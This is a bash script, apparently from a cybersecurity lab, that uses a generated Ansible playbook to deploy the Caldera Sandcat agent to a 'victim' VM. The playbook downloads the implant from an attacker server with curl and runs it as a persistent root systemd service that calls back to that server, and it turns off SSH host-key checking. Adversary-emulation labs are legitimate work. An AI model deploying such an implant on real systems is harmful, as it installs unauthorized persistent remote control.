#!/usr/bin/env bash
# Ubicación: /home/younes/nicscyberlab_v3/tools-installer/scripts/install_caldera_agent.sh
set -euo pipefail

# --- 1. PARÁMETROS RECIBIDOS ---
VICTIM_IP="${1:-}"
SSH_USER_VICTIM="${2:-debian}" 
SSH_KEY="$HOME/.ssh/my_key"

if [[ -z "$VICTIM_IP" ]]; then 
    echo " [ERROR] No se recibió la IP de la víctima."
    exit 1
fi

# --- 2. BÚSQUEDA DINÁMICA DEL ATACANTE ---
ATTACK_DATA=$(openstack server list --name "attack" -f json | jq -r '.[0] // empty')
if [[ -z "$ATTACK_DATA" ]]; then
    ATTACK_IP="10.0.2.214"
else
    ATTACK_IP=$(echo "$ATTACK_DATA" | jq -r '.Networks' | grep -oP '10\.0\.2\.\d+' | head -n 1)
fi

# --- 3. PREPARACIÓN DE ANSIBLE (SIN ALIAS) ---
SAFE_NAME=$(echo "${VICTIM_IP}" | tr '.' '-')
BASE_DIR="$HOME/ansible/caldera-install-$SAFE_NAME"
mkdir -p "$BASE_DIR"

# Corregimos el inventario para que Ansible no falle con los espacios del nombre
cat > "$BASE_DIR/hosts.ini" <<EOF
[victim]
$VICTIM_IP ansible_user=$SSH_USER_VICTIM ansible_ssh_private_key_file=$SSH_KEY ansible_ssh_extra_args='-o StrictHostKeyChecking=no'
EOF

cat > "$BASE_DIR/install_agent.yml" <<EOF
---
- name: "Instalación Limpia de Caldera Sandcat"
  hosts: victim
  become: true
  vars:
    server_url: "http://$ATTACK_IP:8888"
    implant_name: "sandcat"

  tasks:
    - name: "Descargar binario Sandcat"
      shell: |
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server_url }}/file/download > /usr/local/bin/{{ implant_name }}
        chmod +x /usr/local/bin/{{ implant_name }}
      args: { executable: /bin/bash }

    - name: "Configurar servicio systemd"
      copy:
        dest: /etc/systemd/system/caldera-agent.service
        content: |
          [Unit]
          Description=Caldera Sandcat Agent
          After=network.target

          [Service]
          Type=simple
          ExecStart=/usr/local/bin/{{ implant_name }} -server {{ server_url }} -v
          Restart=always
          RestartSec=10

          [Install]
          WantedBy=multi-user.target

    - name: "Iniciar Agente"
      systemd:
        name: caldera-agent
        state: restarted
        enabled: true
        daemon_reload: true
EOF

# --- 4. EJECUCIÓN ---
echo " [INFO] Desplegando Sandcat en $VICTIM_IP (Atacante: $ATTACK_IP)..."
export ANSIBLE_HOST_KEY_CHECKING=False

if ansible-playbook -i "$BASE_DIR/hosts.ini" "$BASE_DIR/install_agent.yml"; then
    echo " [SUCCESS] Agente instalado correctamente."
    exit 0
else
    echo " [ERROR] Falló la ejecución de Ansible."
    exit 1
fi